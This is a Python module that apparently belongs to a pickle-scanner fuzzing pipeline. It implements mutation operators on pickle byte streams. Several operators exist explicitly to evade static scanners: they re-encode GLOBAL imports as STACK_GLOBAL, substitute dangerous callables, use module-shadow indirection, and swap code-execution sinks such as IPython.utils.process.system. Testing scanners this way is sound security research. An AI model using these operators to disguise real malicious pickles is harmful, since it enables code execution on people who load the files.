"""T3.4 — Implement Mutation Operators.

Provides mutators for opcode swapping, dangerous callable substitution,
argument fuzzing, and structural stacking on pickle byte streams.
"""

from __future__ import annotations

import pickle
import random
import struct
from typing import Any

from pipeline.opcodes import parse_pickle, OPCODES_BY_BYTE, OPCODES_BY_NAME, OpcodeCategory, OpcodeClassification
from pipeline.registry import get_all_entries
from pipeline.templates import FAMILY_TEMPLATES
from pipeline.evasion import _enc_short_binunicode, _ensure_proto


class PickleMutator:
    """Implements PickleFuzzer / coverage-guided style mutation operators on pickle streams."""

    def __init__(self):
        self.sample_strings = ["benign", "fuzzed", "", "A" * 10, "A" * 256, "127.0.0.1", "localhost"]
        self.sample_ints = [0, 1, -1, 127, 255, 32767, 65535, 2147483647, -2147483648]
        self.sample_floats = [0.0, 1.0, -1.0, 3.14159, 1e-5, float("inf"), float("-inf"), float("nan")]

    def mutate_opcode_encoding(self, op: OpcodeClassification, arg: bytes) -> tuple[OpcodeClassification, bytes]:
        """Encode a GLOBAL/INST import as proto-4 STACK_GLOBAL string pushes.

        Evasion operator: replaces the delimited two-line GLOBAL operand with
        SHORT_BINUNICODE module/name pushes + STACK_GLOBAL, removing the byte
        pattern static scanners match while resolving the identical callable.
        The enclosing stream must be rebuilt at protocol >= 4; callers using
        this operator inside :meth:`mutate` get the PROTO bump automatically.
        """
        if op.name not in ("GLOBAL", "INST"):
            return op, arg
        try:
            fields = arg.decode("latin1").rstrip("\n").split("\n")
            if len(fields) < 2:
                return op, arg
            encoded = (
                _enc_short_binunicode(fields[0])
                + _enc_short_binunicode(fields[1])
                + OPCODES_BY_NAME["STACK_GLOBAL"].code
            )
            return OPCODES_BY_NAME["STACK_GLOBAL"], encoded
        except Exception:
            return op, arg

    def mutate_opcode_swap(self, op: OpcodeClassification, arg: bytes) -> tuple[OpcodeClassification, bytes]:
        """Swap an opcode for an equivalent one in the same category/stack behavior.

        Only value-op swaps are performed (``NONE`` / ``NEWTRUE`` / ``NEWFALSE``).
        Container-type swaps (``EMPTY_LIST``->``EMPTY_SET`` etc.) and build-op
        swaps (``APPEND``<->``SETITEM``) are deliberately excluded: they change
        the stack/container semantics that later opcodes depend on, producing
        candidates that fail to unpickle and are discarded by the validity
        oracle, which wastes campaign budget and corrupts the feedback signal.
        """
        if op.category == OpcodeCategory.NO_ARG:
            equivalents = {
                "NONE": ["NEWTRUE", "NEWFALSE"],
                "NEWTRUE": ["NONE", "NEWFALSE"],
                "NEWFALSE": ["NONE", "NEWTRUE"],
            }
            if op.name in equivalents:
                new_name = random.choice(equivalents[op.name])
                if new_name in OPCODES_BY_NAME:
                    return OPCODES_BY_NAME[new_name], b""
        return op, arg

    def mutate_callable_substitution(self, op: OpcodeClassification, arg: bytes) -> tuple[OpcodeClassification, bytes]:
        """Substitute a GLOBAL/INST import callable with another from the registry."""
        if op.name in ("GLOBAL", "INST"):
            try:
                parts = arg.decode("latin1").split("\n")
                if len(parts) >= 2:
                    # Select a new dangerous callable from our registry
                    entries = get_all_entries()
                    if entries:
                        entry = random.choice(entries)
                        new_arg = f"{entry.module}\n{entry.name}\n".encode("latin1")
                        return op, new_arg
            except Exception:
                pass
        return op, arg

    def mutate_argument_fuzz(self, op: OpcodeClassification, arg: bytes) -> bytes:
        """Fuzz structural arguments (integers, floats, strings) to boundaries."""
        if op.category == OpcodeCategory.NO_ARG:
            return b""
            
        try:
            # 1. Length-prefixed string/bytes arguments
            if op.category == OpcodeCategory.LENGTH_PREFIXED:
                new_payload = random.choice(self.sample_strings).encode("utf-8")
                length = len(new_payload)
                
                if op.arg_width == 1:
                    prefix = bytes([min(length, 255)])
                    new_payload = new_payload[:255]
                elif op.arg_width == 4:
                    prefix = struct.pack("<I", length)
                elif op.arg_width == 8:
                    prefix = struct.pack("<Q", length)
                else:
                    return arg
                return prefix + new_payload

            # 2. Fixed-width arguments (e.g. floats, ints)
            if op.category == OpcodeCategory.FIXED_ARG:
                assert op.arg_width is not None
                if op.name == "BINFLOAT" and op.arg_width == 8:
                    val = random.choice(self.sample_floats)
                    return struct.pack(">d", val)
                elif op.name == "BININT" and op.arg_width == 4:
                    val = random.choice(self.sample_ints)
                    return struct.pack("<i", val)
                elif op.name == "BININT1" and op.arg_width == 1:
                    val = random.randint(0, 255)
                    return bytes([val])
                elif op.name == "BININT2" and op.arg_width == 2:
                    val = random.randint(0, 65535)
                    return struct.pack("<H", val)
                return arg

            # 3. Delimited arguments (newline terminated)
            if op.category == OpcodeCategory.DELIMITED:
                if op.name in ("GLOBAL", "INST"):
                    return arg  # Handled separately by callable substitution
                    
                if op.name in ("INT", "LONG"):
                    val = random.choice(self.sample_ints)
                    return f"{val}\n".encode("ascii")
                elif op.name == "FLOAT":
                    val = random.choice(self.sample_floats)
                    return f"{val}\n".encode("ascii")
                elif op.name in ("STRING", "UNICODE"):
                    val = random.choice(self.sample_strings)
                    return f"'{val}'\n".encode("utf-8")
        except Exception:
            pass
            
        return arg

    def mutate_structural_stacking(self, pkl_bytes: bytes) -> bytes:
        """Create stacked-pickle variants by appending another independent pickle stream."""
        # Simple valid pickle representing a nested stack payload
        extra_bytes = pickle.dumps({"fuzzed_stack_payload": True})
        return pkl_bytes + extra_bytes

    def mutate_family_synthesis(
        self,
        pkl_bytes: bytes,
        target_family: str,
        donor_family: str
    ) -> bytes:
        """Synthesize a new pickle by combining opcode signatures from two families.

        This creates novel attack variants by:
        1. Parsing the base pickle to extract its opcode sequence
        2. Generating a template pickle from the donor family
        3. Merging structural elements (GLOBAL patterns, string encoding, etc.)

        This explores the (family1 × family2) product space for novel bypasses.
        """
        template_donor = FAMILY_TEMPLATES.get(donor_family)
        template_target = FAMILY_TEMPLATES.get(target_family)
        
        if not template_donor or not template_target:
            return pkl_bytes

        try:
            # Generate a donor template payload to extract structural patterns
            donor_payload = template_donor.generate_pickle_payload("pass")
            donor_parsed = parse_pickle(donor_payload)
            
            # Parse the target/base pickle
            target_parsed = parse_pickle(pkl_bytes)
            
            # Extract signature patterns from donor: GLOBAL imports, string encodings, etc.
            donor_globals = [(op, arg) for op, arg in donor_parsed if op.name in ("GLOBAL", "INST", "STACK_GLOBAL")]
            donor_strings = [(op, arg) for op, arg in donor_parsed if op.name in ("SHORT_BINUNICODE", "BINUNICODE", "UNICODE")]
            
            # Mutate target by injecting donor patterns
            mutated = []
            for i, (op, arg) in enumerate(target_parsed):
                if op.name == "STOP":
                    mutated.append((op, arg))
                    continue
                    
                # Inject donor GLOBAL patterns at random positions
                if donor_globals and random.random() < 0.15:
                    donor_op, donor_arg = random.choice(donor_globals)
                    # Insert before current op
                    mutated.append((donor_op, donor_arg))
                    
                mutated.append((op, arg))
            
            # Also inject string encoding variations from donor
            if donor_strings:
                for i, (op, arg) in enumerate(mutated):
                    if op.name in ("SHORT_BINUNICODE", "BINUNICODE", "UNICODE") and random.random() < 0.2:
                        donor_op, donor_arg = random.choice(donor_strings)
                        # Preserve payload but use donor's encoding style
                        if op.name != donor_op.name:
                            # Convert encoding
                            payload = None
                            if op.name == "SHORT_BINUNICODE":
                                payload = arg[1:].decode("utf-8", "replace")
                            elif op.name == "BINUNICODE":
                                payload = arg[4:].decode("utf-8", "replace")
                            elif op.name == "UNICODE":
                                payload = arg.strip(b"\r\n").decode("utf-8", "replace")
                            
                            if payload is not None:
                                if donor_op.name == "SHORT_BINUNICODE" and len(payload) <= 255:
                                    mutated[i] = (donor_op, bytes([len(payload)]) + payload.encode("utf-8"))
                                elif donor_op.name == "BINUNICODE" and len(payload) <= 0xFFFFFFFF:
                                    mutated[i] = (donor_op, len(payload).to_bytes(4, "little") + payload.encode("utf-8"))
                                elif donor_op.name == "UNICODE":
                                    mutated[i] = (donor_op, payload.encode("utf-8") + b"\n")
            
            return b"".join(op.code + arg for op, arg in mutated)
            
        except Exception:
            return pkl_bytes

    def mutate_gadget_to_overwritten(self, pkl_bytes: bytes) -> bytes:
        """P1.3: Wrap a gadget payload inside an overwritten module shadow.

        Takes a gadget pickle (GLOBAL dangerous + REDUCE) and prepends the
        overwritten-module shadow setup (exec shadow code + POP) so the
        dangerous import is hidden behind collections.OrderedDict indirection.
        """
        try:
            parsed = parse_pickle(pkl_bytes)
            # Find first GLOBAL dangerous to wrap
            has_gadget = any(op.name in ("GLOBAL", "INST", "STACK_GLOBAL") for op, _ in parsed)
            if not has_gadget:
                return pkl_bytes
            # Generate overwritten shadow setup
            from pipeline.templates import OverwrittenModuleTemplate
            tmpl = OverwrittenModuleTemplate()
            shadow_pkl = tmpl.generate_pickle_payload("pass")
            shadow_parsed = parse_pickle(shadow_pkl)
            # shadow_parsed ends with STOP; remove STOP and splice before original
            shadow_body = [p for p in shadow_parsed if p[0].name != "STOP"]
            # Remove initial PROTO from original if present to avoid double PROTO
            orig_body = parsed
            if orig_body and orig_body[0][0].name == "PROTO":
                orig_body = orig_body[1:]
            # Also remove STOP from orig to re-add single STOP
            if orig_body and orig_body[-1][0].name == "STOP":
                orig_body = orig_body[:-1]
            combined = shadow_body + orig_body + [(OPCODES_BY_NAME["STOP"], b".")]
            # Ensure proto
            out = b"".join(op.code + arg for op, arg in combined)
            if not out.startswith(b"\x80"):
                out = OPCODES_BY_NAME["PROTO"].code + b"\x04" + out
            return _ensure_proto(out)
        except Exception:
            return pkl_bytes

    def mutate_external_to_pypi(self, pkl_bytes: bytes) -> bytes:
        """P1.3: Replace external module's local path with PyPI-injected equivalent.

        Swaps numpy.testing._private.utils.runstring → IPython.utils.process.system
        (and vice versa) to explore cross-family sink equivalence.
        """
        try:
            parsed = parse_pickle(pkl_bytes)
            mutated = []
            for op, arg in parsed:
                if op.name in ("GLOBAL", "INST"):
                    try:
                        parts = arg.decode("latin1").split("\n")
                        if len(parts) >= 2:
                            mod, name = parts[0], parts[1]
                            if mod == "numpy.testing._private.utils" and name == "runstring":
                                mutated.append((op, b"IPython.utils.process\nsystem\n"))
                                continue
                            if mod == "IPython.utils.process" and name == "system":
                                mutated.append((op, b"numpy.testing._private.utils\nrunstring\n"))
                                continue
                    except Exception:
                        pass
                mutated.append((op, arg))
            return b"".join(op.code + arg for op, arg in mutated)
        except Exception:
            return pkl_bytes

    def mutate_nested_reduce_chain(self, pkl_bytes: bytes) -> bytes:
        """P1.3: Compose two REDUCE where output of first is callable of second.

        Duplicates the REDUCE tail to create a nested chain: GLOBAL+args+REDUCE
        → (POP) → GLOBAL' + (prev_result as arg) + REDUCE. Currently templates
        use single-level REDUCE; this explores nested invocation for scanner evasion.
        """
        try:
            parsed = parse_pickle(pkl_bytes)
            # Find last REDUCE before STOP
            reduce_idx = -1
            for i, (op, _) in enumerate(parsed):
                if op.name == "REDUCE":
                    reduce_idx = i
            if reduce_idx == -1:
                return pkl_bytes
            # Insert an extra TUPLE+REDUCE after the existing REDUCE, using the
            # result on stack as the callable for the next call with empty args.
            # We use a benign second callable (builtins.len) to keep it valid,
            # but the presence of a second REDUCE changes the structural signature.
            extra = [
                (OPCODES_BY_NAME["GLOBAL"], b"builtins\nlen\n"),
                (OPCODES_BY_NAME["TUPLE"], b""),
                (OPCODES_BY_NAME["REDUCE"], b""),
                (OPCODES_BY_NAME["POP"], b""),
            ]
            # Insert before STOP
            stop_idx = len(parsed) - 1 if parsed[-1][0].name == "STOP" else len(parsed)
            new_parsed = parsed[:stop_idx] + extra + parsed[stop_idx:]
            out = b"".join(op.code + arg for op, arg in new_parsed)
            return _ensure_proto(out)
        except Exception:
            return pkl_bytes

    def mutate(
        self,
        pkl_bytes: bytes,
        op_swap_prob: float = 0.1,
        callable_sub_prob: float = 0.2,
        arg_fuzz_prob: float = 0.2,
        stack_prob: float = 0.05,
        encoding_prob: float = 0.0,
        family_synthesis_prob: float = 0.0,
        target_family: str = "gadget",
        donor_family: str = "overwritten",
        gadget_to_overwritten_prob: float = 0.0,
        external_to_pypi_prob: float = 0.0,
        nested_reduce_prob: float = 0.0,
    ) -> bytes:
        """Parse, apply selected mutation operators, and reconstruct the pickle stream.

        ``encoding_prob`` (Phase 1 evasion operator) rewrites GLOBAL/INST
        imports to STACK_GLOBAL form; when it fires at least once the stream
        is rebuilt at protocol >= 4 so the result stays loadable.
        
        ``family_synthesis_prob`` (Phase 3b) combines structural signatures
        from a donor ShadowPickle family into the target family's stream,
        exploring the (family1 × family2) product space for novel bypasses.
        """
        # 1. Structural stacking mutation
        if random.random() < stack_prob:
            pkl_bytes = self.mutate_structural_stacking(pkl_bytes)

        # 1b. Family synthesis mutation (Phase 3b)
        if family_synthesis_prob and random.random() < family_synthesis_prob:
            pkl_bytes = self.mutate_family_synthesis(pkl_bytes, target_family, donor_family)

        # 1c. P1.3 cross-family operators
        if gadget_to_overwritten_prob and random.random() < gadget_to_overwritten_prob:
            pkl_bytes = self.mutate_gadget_to_overwritten(pkl_bytes)
        if external_to_pypi_prob and random.random() < external_to_pypi_prob:
            pkl_bytes = self.mutate_external_to_pypi(pkl_bytes)
        if nested_reduce_prob and random.random() < nested_reduce_prob:
            pkl_bytes = self.mutate_nested_reduce_chain(pkl_bytes)

        parsed = parse_pickle(pkl_bytes)
        mutated_parsed = []
        encoded_any = False

        for op, arg in parsed:
            if op.name == "STOP":
                mutated_parsed.append((op, arg))
                continue

            curr_op, curr_arg = op, arg

            # 2. Opcode swapping mutation
            if random.random() < op_swap_prob:
                curr_op, curr_arg = self.mutate_opcode_swap(curr_op, curr_arg)

            # 3. Callable substitution mutation
            if random.random() < callable_sub_prob:
                curr_op, curr_arg = self.mutate_callable_substitution(curr_op, curr_arg)

            # 3b. Evasion encoding mutation (GLOBAL -> STACK_GLOBAL form)
            if encoding_prob and random.random() < encoding_prob:
                new_op, new_arg = self.mutate_opcode_encoding(curr_op, curr_arg)
                if new_op.name == "STACK_GLOBAL" and curr_op.name != "STACK_GLOBAL":
                    encoded_any = True
                curr_op, curr_arg = new_op, new_arg

            # 4. Argument fuzzing mutation
            if random.random() < arg_fuzz_prob:
                curr_arg = self.mutate_argument_fuzz(curr_op, curr_arg)

            mutated_parsed.append((curr_op, curr_arg))

        out = b"".join(op.code + arg for op, arg in mutated_parsed)
        if encoded_any:
            out = _ensure_proto(out)
        return out
